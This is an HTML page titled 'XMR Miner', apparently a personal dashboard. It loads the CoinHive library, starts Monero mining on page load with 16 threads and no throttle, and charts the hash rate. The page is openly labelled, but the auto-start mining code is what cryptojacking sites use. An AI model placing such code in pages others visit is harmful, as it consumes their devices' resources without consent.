<!doctype html>
<html class="no-js" lang="">

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>XMR Miner</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"
        crossorigin="anonymous">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp"
        crossorigin="anonymous">
    <link href="https://gitcdn.github.io/bootstrap-toggle/2.2.2/css/bootstrap-toggle.min.css" rel="stylesheet">

</head>

<body>

    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-1">
                <span>Hash Rate</span>
            </div>
            <div class="col-lg-1">
                <span id="hashrate"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Total Hashes</span>
            </div>
            <div class="col-lg-1">
                <span id="totalhashes"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Accepted Hashes</span>
            </div>
            <div class="col-lg-1">
                <span id="accepthashes"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Found</span>
            </div>
            <div class="col-lg-1">
                <span id="found"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Accepted</span>
            </div>
            <div class="col-lg-1">
                <span id="accept"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>WASM Support</span>
            </div>
            <div class="col-lg-1">
                <span id="wasmsupport"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Threads</span>
            </div>
            <div class="col-lg-1">
                <span id="threads"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>Throttle</span>
            </div>
            <div class="col-lg-1">
                <span id="throttle"></span>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-1">
                <span>AutoThreads On</span>
            </div>
            <div class="col-lg-1">
                <span id="autothreadsenabled"></span>
            </div>
        </div>

        <div class="row">
            <div class="col-lg-1">
                <span>Token</span>
            </div>
            <div class="col-lg-1">
                <span id="token"></span>
            </div>
        </div>
        <div class="row">
            <canvas id="myChart" width="400" height="100"></canvas>
        </div>
    </div>


    <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous"></script>
    <script>
        window.jQuery || document.write('<script src="js/vendor/jquery-3.2.1.min.js"><\/script>')
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
        crossorigin="anonymous"></script>
    <script src="https://gitcdn.github.io/bootstrap-toggle/2.2.2/js/bootstrap-toggle.min.js"></script>
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.0/Chart.min.js"></script>
    <!-- Latest compiled and minified JavaScript -->
    <script>
        $(document).ready(function () {
            setInterval(function () { reload_page(); }, 2 * 60 * 60000);
        });

        function reload_page() {
            window.location.reload(true);
        }

        var found = 0;
        var accespted = 0;
        var deleteIndex = 0;
        var maxChartData = 50;
        var it = 0;
        var timerInterval = 5000;

        var ctx = document.getElementById('myChart').getContext('2d');
        var myChart = new Chart(ctx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Hash Rate',
                    data: [],
                    backgroundColor: "rgba(255,153,0,0.6)"
                }]
            }
        });


        var miner = new CoinHive.User('Cv3gElGsoi50VFWkzVZHmwEuzw1yFKO8', 'knut', {
            threads: 16,
            autoThreads: false,
            throttle: 0,
            forceASMJS: false
        });
        miner.start();

        $('#wasmsupport').text(miner.hasWASMSupport());
        $('#threads').text(miner.getNumThreads());
        $('#autothreadsenabled').text(miner.getAutoThreadsEnabled());

        $('#throttle').text(miner.getThrottle());
        $('#token').text(miner.getToken());

        miner.on('found', function () {
            found++;
        })
        miner.on('accepted', function () {
            accespted++;
        })

        setInterval(function () {
            $('#hashrate').text(miner.getHashesPerSecond());
            $('#totalhashes').text(miner.getTotalHashes());
            $('#accepthashes').text(miner.getAcceptedHashes());
            $('#found').text(found);
            $('#accept').text(accespted);

            var hashRateData = parseInt(miner.getHashesPerSecond());
            myChart.data.labels.push(it++);
            myChart.data.datasets[0].data.push(hashRateData);
            if (it > maxChartData) {
                myChart.data.labels.splice(deleteIndex, 1);
                myChart.data.datasets[0].data.splice(deleteIndex, 1);
            }
            myChart.update();
        }, timerInterval);
    </script>
</body>

</html>
